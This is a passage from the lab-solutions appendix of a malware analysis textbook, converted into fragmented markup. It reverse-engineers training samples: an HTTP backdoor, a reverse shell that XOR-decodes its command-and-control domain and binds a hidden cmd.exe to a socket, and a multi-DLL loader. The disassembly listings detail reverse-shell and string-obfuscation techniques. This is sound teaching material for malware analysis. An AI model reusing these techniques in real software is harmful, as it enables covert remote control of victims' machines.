    and puts it in a buffer. Now let’s try the same approach with the functions that
    start at addresses 0x401470 and 0x401D80\.
  prefs: []
  type: TYPE_NORMAL
- en: '**538**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The function that starts at 0x401470 is analogous to the function that starts
    at 0x401420, except that it returns the number 80 (0x50) rather than a URL. This
    string contains the port number associated with the server at *http://www.practicalmalwareanalysis.com/*.
  prefs: []
  type: TYPE_NORMAL
- en: The function that starts at 0x401D80 is a little different in that it does not
    return the same value at each invocation. Rather, it appears to return an ASCII
    string containing random characters. After debugging this function many times,
    a pattern will appear that involves the forward slash (/) and dot (.) characters.
    Perhaps the returned string corresponds to a URL-like scheme.
  prefs: []
  type: TYPE_NORMAL
- en: When the malware is analyzed in an isolated testing environment, it will repeatedly
    fail somewhere within the next function, which starts at address 0x401D80\. Returning
    to the disassembly view of IDA Pro, we see that within this function, the malware
    constructs an HTTP/1.0 GET request and connects to a remote system. This connection
    is unlikely to be blocked by corporate firewalls, since it is a valid outbound
    HTTP request. If your malware analysis **9**
  prefs: []
  type: TYPE_NORMAL
- en: virtual machine has networking disabled, the outbound connection will never
    succeed, and the malware fails. However, by following the disassembly listing
    carefully, you will see that the malware does, in fact, attempt to connect to
    the domain and port recorded in the registry configuration key, and requests a
    randomly named resource. Further analysis of the disassembly shows that the malware
    searches the document returned by the server for the particular strings `’`’`
    (backtick, apostrophe, backtick, apostrophe, backtick) and ’`’`’ (apostrophe,
    backtick, apostrophe, backtick, apostrophe), and uses these to delineate the command-and-control
    protocol.
  prefs: []
  type: TYPE_NORMAL
- en: '**Malware Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: This sample is an HTTP reverse backdoor. The password abcd must be provided
    as the last parameter when invoking the malware for installation, configuration,
    and removal. It installs itself by copying itself to the *%SYSTEMROOT%\* *WINDOWS\system32*
    directory and creating an autorun service. The malware can be cleanly removed
    by passing the command-line argument -re, or reconfigured using the -c flag.
  prefs: []
  type: TYPE_NORMAL
- en: When run after installation, the malware uses a registry key to fetch server
    configuration information, and makes HTTP/1.0 GET requests to the remote system.
    The command-and-control protocol is embedded within the response document. The
    malware recognizes five commands, including one that specifies the execution of
    arbitrary shell commands.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 9-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The imports and the string cmd are the only interesting strings that appear
    statically in the binary.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: It terminates without doing much.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: Rename the file *ocl.exe* before you run it.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**539**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: A string is being built on the stack, which is used by attackers to obfuscate
    strings from simple strings utilities and basic static analysis techniques.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The string 1qaz2wsx3edc and a pointer to a buffer of data are passed to subroutine
    0x401089\.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware uses the domain *practicalmalwareanalysis.com*.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware will XOR the encoded DNS name with the string 1qaz2wsx3edc to decode
    the domain name.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware is setting the stdout, stderr, and stdin handles (used in the STARTUPINFO
    structure of CreateProcessA) to the socket. Since CreateProcessA is called with
    cmd as an argument, this will create a reverse shell by tying the command shell
    to the socket.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We will use dynamic analysis and OllyDbg to analyze this piece of malware in
    order to determine its functionality. But before we get into debugging, let’s
    begin by running Strings on the binary. We see the imports and the string cmd.
    Next, we’ll simply run the binary to see if anything interesting happens.
  prefs: []
  type: TYPE_NORMAL
- en: Based on the process launch and exit in Process Explorer, the process seems
    to terminate almost immediately. We are definitely going to need to debug this
    piece to see what’s going on.
  prefs: []
  type: TYPE_NORMAL
- en: When we load the binary into IDA Pro, we see the main function begins at 0x401128\.
    OllyDbg will break at the entry point of the application, but the entry point
    contains a lot of uninteresting code generated by the compiler, so we’ll set a
    software breakpoint on main, since we want to focus on it.
  prefs: []
  type: TYPE_NORMAL
- en: '**Decoding Stack-Formed Strings**'
  prefs: []
  type: TYPE_NORMAL
- en: If we click the **Run** button, we hit the first breakpoint at main. The first
    thing to notice is a large series of mov instructions moving single bytes into
    local variables beginning at , as shown in Listing 9-4L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401128 push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 00401129 mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 0040112B sub esp, 304h
  prefs: []
  type: TYPE_NORMAL
- en: 00401131 push esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401132 push edi
  prefs: []
  type: TYPE_NORMAL
- en: 00401133 mov [ebp+var_1B0], 31h 
  prefs: []
  type: TYPE_NORMAL
- en: 0040113A mov [ebp+var_1AF], 71h
  prefs: []
  type: TYPE_NORMAL
- en: 00401141 mov [ebp+var_1AE], 61h
  prefs: []
  type: TYPE_NORMAL
- en: 00401148 mov [ebp+var_1AD], 7Ah
  prefs: []
  type: TYPE_NORMAL
- en: 0040114F mov [ebp+var_1AC], 32h
  prefs: []
  type: TYPE_NORMAL
- en: 00401156 mov [ebp+var_1AB], 77h
  prefs: []
  type: TYPE_NORMAL
- en: 0040115D mov [ebp+var_1AA], 73h
  prefs: []
  type: TYPE_NORMAL
- en: 00401164 mov [ebp+var_1A9], 78h
  prefs: []
  type: TYPE_NORMAL
- en: 0040116B mov [ebp+var_1A8], 33h
  prefs: []
  type: TYPE_NORMAL
- en: 00401172 mov [ebp+var_1A7], 65h
  prefs: []
  type: TYPE_NORMAL
- en: 00401179 mov [ebp+var_1A6], 64h
  prefs: []
  type: TYPE_NORMAL
- en: 00401180 mov [ebp+var_1A5], 63h
  prefs: []
  type: TYPE_NORMAL
- en: 00401187 mov [ebp+var_1A4], 0 
  prefs: []
  type: TYPE_NORMAL
- en: '**540**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040118E mov [ebp+Str1], 6Fh 00401195 mov [ebp+var_19F], 63h
  prefs: []
  type: TYPE_NORMAL
- en: 0040119C mov [ebp+var_19E], 6Ch
  prefs: []
  type: TYPE_NORMAL
- en: 004011A3 mov [ebp+var_19D], 2Eh
  prefs: []
  type: TYPE_NORMAL
- en: 004011AA mov [ebp+var_19C], 65h
  prefs: []
  type: TYPE_NORMAL
- en: 004011B1 mov [ebp+var_19B], 78h
  prefs: []
  type: TYPE_NORMAL
- en: 004011B8 mov [ebp+var_19A], 65h
  prefs: []
  type: TYPE_NORMAL
- en: 004011BF mov [ebp+var_199], 0 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-4L: Building an ASCII string on the stack, one character at a time*
    This code builds two ASCII strings by moving each character onto the stack followed
    by NULL terminators at  and , which is a popular method for string obfuscation.
    The obfuscated strings will be referenced by the first variable of the string,
    which will give us the full NULL-terminated ASCII string. We single-step over
    these moves to look for signs of these strings being **9**'
  prefs: []
  type: TYPE_NORMAL
- en: created on the stack in the lower-right pane. We stop executing at 0x4011C6,
    right-click EBP, and select **Follow in Dump.** By scrolling up to the first string
  prefs: []
  type: TYPE_NORMAL
- en: '[EBP-1B0], we can see the string 1qaz2wsx3edc being created. The second string
    is created at [EBP-1A0] and named ocl.exe.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Filename Check**'
  prefs: []
  type: TYPE_NORMAL
- en: After these strings are created, we can see a call to GetModuleFileNameA in
    Listing 9-5L at , and then a function call within the *Lab09-02.exe* malware
    to 0x401550\. If we try to analyze this function in OllyDbg, we’ll find that it’s
    rather complicated. If we examine it in IDA Pro, we’ll see that it is the C runtime
    library function _strrchr. OllyDbg missed this due to the lack of symbol support.
    If we load the binary into IDA Pro, we can let IDA Pro use its FLIRT
  prefs: []
  type: TYPE_NORMAL
- en: signature detection to correctly identify these APIs, as shown as shown at .
  prefs: []
  type: TYPE_NORMAL
- en: 00401208 call ds:GetModuleFileNameA 
  prefs: []
  type: TYPE_NORMAL
- en: 0040120E push 5Ch ; Ch
  prefs: []
  type: TYPE_NORMAL
- en: 00401210 lea ecx, [ebp+Str]
  prefs: []
  type: TYPE_NORMAL
- en: 00401216 push ecx ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 00401217 call **_strrchr** 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-5L: IDA Pro labels strrchr properly, but OllyDbg does not.*'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s verify this by setting a breakpoint on the call at 0x401217\. We can see
    two arguments being pushed on the stack. The first is a forward slash, and the
    second is the value being returned from the GetModuleFileNameA call, which would
    be the current name of the executable. The malware is searching backward for a
    forward slash (0x5C character) in an attempt to get the name (rather than the
    full path) of the executable being executed. If we step-over the call to _strrchr,
    we can see that EAX is pointing to the string
  prefs: []
  type: TYPE_NORMAL
- en: \Lab09-02.exe.
  prefs: []
  type: TYPE_NORMAL
- en: The next function call (0x4014C0) reveals a situation similar to _strrchr.
  prefs: []
  type: TYPE_NORMAL
- en: IDA Pro identifies this function as _strcmp, as shown in Listing 9-6L.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**541**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040121F mov [ebp+Str2], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401222 mov edx, [ebp+Str2]
  prefs: []
  type: TYPE_NORMAL
- en: 00401225 add edx, 1 
  prefs: []
  type: TYPE_NORMAL
- en: 00401228 mov [ebp+Str2], edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040122B mov eax, [ebp+Str2]
  prefs: []
  type: TYPE_NORMAL
- en: 0040122E push eax ; Str2
  prefs: []
  type: TYPE_NORMAL
- en: 0040122F lea ecx, [ebp+Str1]
  prefs: []
  type: TYPE_NORMAL
- en: 00401235 push ecx ; Str1
  prefs: []
  type: TYPE_NORMAL
- en: 00401236 call **_strcmp**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-6L: IDA Pro labels strcmp properly, but OllyDbg does not.*'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll determine which strings are being compared by setting a breakpoint on
    the call to _strcmp at 0x401236\. Once our breakpoint is hit, we can see the two
    strings being sent to the _strcmp call. The first is the pointer to the GetModuleFileNameA
    call (incremented by one at  to account for the forward slash), and the other
    is ocl.exe (our decoded string from earlier). If the strings match, EAX should
    contain 0, the test eax,eax will set the zero flag to true, and execution will
    then go to 0x40124C. If the condition is false, it looks like the program will
    exit, which explains why the malware terminated when we tried to execute it earlier.
    The malware must be named *ocl.exe* in order to properly execute.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s rename the binary *ocl.exe* and set a breakpoint at 0x40124C. If our analysis
    is correct, the malware should not exit, and our breakpoint will be hit. Success!
    Our breakpoint was hit, and we can continue our analysis in OllyDbg.
  prefs: []
  type: TYPE_NORMAL
- en: '**Decoding XOR Encoded Strings**'
  prefs: []
  type: TYPE_NORMAL
- en: WSAStartup and WSASocket are imported, so we can assume some networking functionality
    is going to be taking place. The next major function call is at 0x4012BD to the
    function 0x401089\. Let’s set a breakpoint at 0x401089
  prefs: []
  type: TYPE_NORMAL
- en: and inspect the stack for the arguments to this function call.
  prefs: []
  type: TYPE_NORMAL
- en: The two arguments being passed to this function are a stack buffer (encoded
    string) and the string 1qaz2wsx3edc (key string). We step-into the function and
    step to the call at 0x401440, which passes the key string to strlen. It returns
    0xC and moves it into [EBP-104]. Next, [EBP-108] is initialized to 0\. OllyDbg
    has noted a loop in progress, which makes sense since [EBP-108]
  prefs: []
  type: TYPE_NORMAL
- en: is a counter that is incremented at 0x4010DA and compared to 0x20 at 0x4010E3\.
    As the loop continues to execute, we see our key string going through an idiv
    and mov instruction sequence, as shown Listing 9-7L.
  prefs: []
  type: TYPE_NORMAL
- en: 004010E3 cmp [ebp+var_108], 20h
  prefs: []
  type: TYPE_NORMAL
- en: 004010EA
  prefs: []
  type: TYPE_NORMAL
- en: jge short loc_40111D 
  prefs: []
  type: TYPE_NORMAL
- en: 004010EC mov edx, [ebp+arg_4]
  prefs: []
  type: TYPE_NORMAL
- en: 004010EF add edx, [ebp+var_108]
  prefs: []
  type: TYPE_NORMAL
- en: 004010F5 movsx ecx, byte ptr [edx]
  prefs: []
  type: TYPE_NORMAL
- en: 004010F8 mov eax, [ebp+var_108]
  prefs: []
  type: TYPE_NORMAL
- en: 004010FE cdq
  prefs: []
  type: TYPE_NORMAL
- en: 004010FF idiv [ebp+var_104]
  prefs: []
  type: TYPE_NORMAL
- en: '**542**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401105 mov eax, [ebp+Str]
  prefs: []
  type: TYPE_NORMAL
- en: 00401108 movsx edx, byte ptr [eax+edx] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040110C xor ecx, edx 
  prefs: []
  type: TYPE_NORMAL
- en: 0040110E mov eax, [ebp+var_108]
  prefs: []
  type: TYPE_NORMAL
- en: 00401114 mov [ebp+eax+var_100], cl
  prefs: []
  type: TYPE_NORMAL
- en: 0040111B jmp short loc_4010D4
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-7L: String decoding functionality*'
  prefs: []
  type: TYPE_NORMAL
- en: This is getting an index into the string. Notice the use of EDX after the idiv
    instruction at , which is using modulo to allow the malware to loop over the
    string in case the encoded string length is longer than our key string. We then
    see an interesting XOR at .
  prefs: []
  type: TYPE_NORMAL
- en: If we set a breakpoint at 0x4010F5, we can see which value is being pointed
    to by EDX and being moved into ECX, which will tell us the value that is getting
    XOR’ed later in the function. When we click **Follow in Dump** **9**
  prefs: []
  type: TYPE_NORMAL
- en: on EDX, we see that this is a pointer to the first argument to this function
    call (encoded string). ECX will contain 0x46, which is the first byte in the encoded
    string. We set a breakpoint at  to see what is being XOR’ed on the first iteration
    through the loop. We see that EDX will contain 0x31 (first byte of key string),
    and we again see that ECX will contain 0x46\.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s execute the loop a few more times and try to make sense of the string
    being decoded. After clicking play a few more times, we can see the string www.prac.
    This could be the start of a domain that the malware is trying to communicate
    with. Let’s continue until var_108 ([EBP-108], our counter variable) equals 0x20\.
    Once the jge short 0x40111D at  is taken, the final string placed into EAX is
    www.practicalmalwareanalysis.com (which happens to be of length 0x20), and the
    function will then return to the main function. This function decoded the string
    www.practicalmalwareanalysis.com by using a multibyte XOR loop of the string 1qaz2wsx3edc.
  prefs: []
  type: TYPE_NORMAL
- en: Back in the main function, we see EAX being passed to a gethostbyname call.
    This value will return an IP address, which will populate the sockaddr_in structure.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see a call to ntohs with an argument of 0x270f, or 9999 in decimal.
  prefs: []
  type: TYPE_NORMAL
- en: This argument is moved into a sockaddr_in structure along with 0x2, which represents
    AF_INET (the code for Internet sockets) in the sockaddr_in structure.
  prefs: []
  type: TYPE_NORMAL
- en: The next call will connect the malware to *www.practicalmalwareanalysis.com*
    on TCP port 9999\. If the connection succeeds, the malware will continue executing
    until 0x40137A. If it fails, the malware will sleep for 30 seconds, go back to
    the beginning of the main function, and repeat the process again. We can use Netcat
    and ApateDNS to fool the malware into connecting back to an IP we control.
  prefs: []
  type: TYPE_NORMAL
- en: If we step-into the function call made at 0x4013a9 (step-into 0x401000), we
    see two function calls to 0x4013E0\. Again, this is another example where OllyDbg
    does not identify a system call of memset, whereas IDA Pro does identify the function.
    Next, we see a call to CreateProcessA at 0x40106E, as shown in Listing 9-8L. Before
    the call, some structure is being populated. We’ll turn to IDA Pro to shed some
    light on what’s going on here.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**543**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Reverse Shell Analysis**'
  prefs: []
  type: TYPE_NORMAL
- en: This appears to be a reverse shell, created using a method that’s popular among
    malware authors. In this method, the STARTUPINFO structure that is passed to CreateProcessA
    is manipulated. CreateProcessA is called, and it runs *cmd.exe* with its window
    suppressed, so that it isn’t visible to the user under attack. Before the call
    to CreateProcessA, a socket is created and a connection is established to a remote
    server. That socket is tied to the standard streams (stdin, stdout, and stderr)
    for *cmd.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 9-8L shows this method of reverse shell creation in action.
  prefs: []
  type: TYPE_NORMAL
- en: 0040103B mov [ebp+StartupInfo.wShowWindow], **SW_HIDE** 
  prefs: []
  type: TYPE_NORMAL
- en: 00401041 mov edx, [ebp+**Socket**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401044 mov [ebp+StartupInfo. **hStdInput**], edx 
  prefs: []
  type: TYPE_NORMAL
- en: 00401047 mov eax, [ebp+StartupInfo.hStdInput]
  prefs: []
  type: TYPE_NORMAL
- en: 0040104A mov [ebp+StartupInfo. **hStdError**], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 0040104D mov ecx, [ebp+StartupInfo.hStdError]
  prefs: []
  type: TYPE_NORMAL
- en: 00401050 mov [ebp+StartupInfo. **hStdOutput**], ecx 
  prefs: []
  type: TYPE_NORMAL
- en: 00401053 lea edx, [ebp+ProcessInformation]
  prefs: []
  type: TYPE_NORMAL
- en: 00401056 push edx ; lpProcessInformation
  prefs: []
  type: TYPE_NORMAL
- en: 00401057 lea eax, [ebp+StartupInfo]
  prefs: []
  type: TYPE_NORMAL
- en: 0040105A push eax ; lpStartupInfo
  prefs: []
  type: TYPE_NORMAL
- en: 0040105B push 0 ; lpCurrentDirectory
  prefs: []
  type: TYPE_NORMAL
- en: 0040105D push 0 ; lpEnvironment
  prefs: []
  type: TYPE_NORMAL
- en: 0040105F push 0 ; dwCreationFlags
  prefs: []
  type: TYPE_NORMAL
- en: 00401061 push 1 ; bInheritHandles
  prefs: []
  type: TYPE_NORMAL
- en: 00401063 push 0 ; lpThreadAttributes
  prefs: []
  type: TYPE_NORMAL
- en: 00401065 push 0 ; lpProcessAttributes
  prefs: []
  type: TYPE_NORMAL
- en: 00401067 push offset CommandLine ; " **cmd**" 
  prefs: []
  type: TYPE_NORMAL
- en: 0040106C push 0 ; lpApplicationName
  prefs: []
  type: TYPE_NORMAL
- en: 0040106E call ds:**CreateProcessA**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-8L: Creating a reverse shell using CreateProcessA and the STARTUPINFO
    structure* The STARTUPINFO structure is manipulated, and then parameters are passed
    to CreateProcessA. We see that CreateProcessA is going to run *cmd.exe* because
    it is passed as a parameter at . The wShowWindow member of the structure is set
    to SW_HIDE at , which will hide *cmd.exe*’s window when it is launched. At ,
    , and , we see that the standard streams in the STARTUPINFO structure are set
    to the socket. This directly ties the standard streams to the socket for *cmd.exe*,
    so when it is launched, all of the data that comes over the socket will be sent
    to *cmd.exe*, and all output generated by *cmd.exe* will be sent over the socket.'
  prefs: []
  type: TYPE_NORMAL
- en: In summary, we determined that this malware is a simple reverse shell with obfuscated
    strings that must be renamed *ocl.exe* before it can be run successfully. The
    strings are obfuscated using the stack and a multibyte XOR. In Chapter 13, we
    will cover data-encoding techniques like this in more detail.
  prefs: []
  type: TYPE_NORMAL
- en: '**544**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 122](index-578_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '**Lab 9-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The import table contains *kernel32.dll*, *NetAPI32.dll*, *DLL1.dll*, and *DLL2.dll*.
    The malware dynamically loads *user32.dll* and *DLL3.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: 'All three DLLs request the same base address: 0x10000000\.'
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: '*DLL1.dll* is loaded at 0x10000000, *DLL2.dll* is loaded at 0x320000, and *DLL3.dll*
    is loaded at 0x380000 (this may be slightly different on your machine).'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: DLL1Print is called, and it prints “DLL 1 mystery data,” followed by the contents
    of a global variable.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: DLL2ReturnJ returns a filename of *temp.txt* which is passed to the call to
    WriteFile.
  prefs: []
  type: TYPE_NORMAL
- en: '**9**'
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab09-03.exe* gets the buffer for the call to NetScheduleJobAdd from DLL3GetStructure,
    which it dynamically resolves.'
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: Mystery data 1 is the current process identifier, mystery data 2 is the handle
    to the open *temp.txt* file, and mystery data 3 is the location in memory of the
    string ping www.malwareanalysisbook.com.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: Select Manual Load when loading the DLL with IDA Pro, and then type the new
    image base address when prompted. In this case, the address is 0x320000\.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We start by examining the import table of *Lab09-03.exe* and it contains *kernel32.dll*,
    *NetAPI32.dll*, *DLL1.dll*, and *DLL2.dll*. Next, we load *Lab09-03.exe* into
    IDA Pro. We look for calls to LoadLibrary and check which strings are pushed on
    the stack before the call. We see two cross-references to LoadLibrary that push
    *user32.dll* and *DLL3.dll* respectively, so that these DLLs may be loaded dynamically
    during runtime.
  prefs: []
  type: TYPE_NORMAL
- en: We can check the base address requested by the DLLs by using PEview, as shown
    in Figure 9-10L. After loading *DLL1.dll* into PEview, click the IMAGE_OPTIONAL_HEADER
    and look at the value of Image Base, as shown at  in the figure. We repeat this
    process with *DLL2.dll* and *DLL3.dll*, and see that they all request a base address
    of 0x10000000\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-10L: Finding the requested base address with PEview* Solutions to
    Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**545**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 123](index-579_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '**Using the Memory Map to Locate DLLs**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we want to figure out at which memory address the three DLLs are loaded
    during runtime. *DLL1.dll* and *DLL2.dll* are loaded immediately because they’re
    in the import table. Since *DLL3.dll* is loaded dynamically, we will need to run
    the LoadLibrary function located at 0x401041\. We can do this by loading *Lab09-03.exe*
    into OllyDbg, setting a breakpoint at 0x401041, and clicking play. Once the breakpoint
    hits, we can step over the call to LoadLibrary. At this point, all three DLLs
    are loaded into *Lab09-03.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: We bring up the memory map by selecting **View****Memory**. The memory map
    is shown in Figure 9-11L (it may appear slightly different on your machine). At
    , we see that *DLL1.dll* gets its preferred base address of 0x10000000\. At ,
    we see that *DLL2.dll* didn’t get its preferred base address because *DLL1.dll*
    was already loaded at that location, so *DLL2.dll* is loaded at 0x320000\. Finally,
    at , we see that *DLL3.dll* is loaded at 0x380000\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 9-11L: Using the OllyDbg memory map*'
  prefs: []
  type: TYPE_NORMAL
- en: '*to examine DLL load locations*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 9-9L shows the calls to the exports of *DLL1.dll* and *DLL2.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: 00401006 call ds:**DLL1Print**
  prefs: []
  type: TYPE_NORMAL
- en: 0040100C call ds:**DLL2Print**
  prefs: []
  type: TYPE_NORMAL
- en: 00401012 call ds:**DLL2ReturnJ**
  prefs: []
  type: TYPE_NORMAL
- en: 00401018 mov [ebp+hObject], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 0040101B push 0 ; lpOverlapped 0040101D lea eax, [ebp+NumberOfBytesWritten]
  prefs: []
  type: TYPE_NORMAL
- en: 00401020 push eax ; lpNumberOfBytesWritten 00401021 push 17h ; nNumberOfBytesToWrite
    00401023 push offset aMalwareanalysi ; "malwareanalysisbook.com"
  prefs: []
  type: TYPE_NORMAL
- en: 00401028 mov ecx, [ebp+hObject]
  prefs: []
  type: TYPE_NORMAL
- en: 0040102B push ecx 
  prefs: []
  type: TYPE_NORMAL
- en: ; hFile
  prefs: []
  type: TYPE_NORMAL
- en: 0040102C call ds:**WriteFile**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-9L: Calls to the exports of* DLL1.dll *and* DLL2.dll *from* Lab09-03.exe
    At the start of Listing 9-9L, we see a call to DLL1Print, which is an export of
    *DLL1.dll*. We disassemble *DLL1.dll* with IDA Pro and see that the function prints
    “DLL 1 mystery data,” followed by the contents of a global variable, dword_10008030\.
    If we examine the cross-references to dword_10008030, we see that it is accessed
    in DllMain when the return value from the call **546**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: GetCurrentProcessId is moved into it. Therefore, we can conclude that DLL1Print
    prints the current process ID, which it determines when the DLL is first loaded
    into the process.
  prefs: []
  type: TYPE_NORMAL
- en: 'In Listing 9-9L, we see calls to two exports from *DLL2.dll*: DLL2Print and
    DLL2ReturnJ. We can disassemble *DLL2.dll* with IDA Pro and examine DLL2Print
    to see that it prints “DLL 2 mystery data,” followed by the contents of a global
    variable, dword_1000B078\. If we examine the cross-references to dword_1000B078,
    we see that it is accessed in DllMain when the handle to CreateFileA is moved
    into it. The CreateFileA function opens a file handle to *temp.txt*, which the
    function creates if it doesn’t already exist. DLL2Print apparently prints the
    value of the handle for *temp.txt*. We can look at the DLL2ReturnJ export and
    find that it returns the same handle that DLL2Print prints. Further in Listing
    9-9L, at , the handle is moved into hObject, which is passed to WriteFile at
     defining where malwareanalysisbook.com is written.'
  prefs: []
  type: TYPE_NORMAL
- en: After the WriteFile in *Lab09-03.exe*, *DLL3.dll* is loaded with a call to **9**
  prefs: []
  type: TYPE_NORMAL
- en: LoadLibrary, followed by the dynamic resolution of DLL3Print and DLL3GetStructure
    using GetProcAddress. First, it calls DLL3Print, which prints “DLL 3 mystery data,”
    followed by the contents of a global variable found at 0x1000B0C0\.
  prefs: []
  type: TYPE_NORMAL
- en: When we check the cross-references for the global variable, we see that it is
    initialized in DllMain to the string ping www.malwareanalysisbook.com, so the
    memory location of the string will again be printed. DLL3GetStructure appears
    to return a pointer to the global dword_1000B0A0, but it is unclear what data
    is in that location. DllMain appears to initialize some sort of structure at this
    location using data and the string. Since DLL3GetStructure sets a pointer to this
    structure, we will need to see how *Lab09-03.exe* uses the data to figure out
    the contents of the structure. Listing 9-10L shows the call to DLL3GetStructure
    at .
  prefs: []
  type: TYPE_NORMAL
- en: 00401071 lea edx, [ebp+Buffer]
  prefs: []
  type: TYPE_NORMAL
- en: 00401074 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 00401075 call [ebp+var_10] 
  prefs: []
  type: TYPE_NORMAL
- en: ; **DLL3GetStructure**
  prefs: []
  type: TYPE_NORMAL
- en: 00401078 add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 0040107B lea eax, [ebp+JobId]
  prefs: []
  type: TYPE_NORMAL
- en: 0040107E push eax ; JobId 0040107F mov ecx, [ebp+**Buffer**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401082 push ecx ; Buffer 00401083 push 0 ; Servername 00401085 call **NetScheduleJobAdd**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 9-10L: Calls to DLL3GetStructure followed by NetScheduleJobAdd in*
    Lab09-03.exe It appears that the result of that call is the structure pointed
    to by Buffer, which is subsequently passed to NetScheduleJobAdd. Viewing the MSDN
    page for NetScheduleJobAdd tells us that Buffer is a pointer to an AT_INFO structure.'
  prefs: []
  type: TYPE_NORMAL
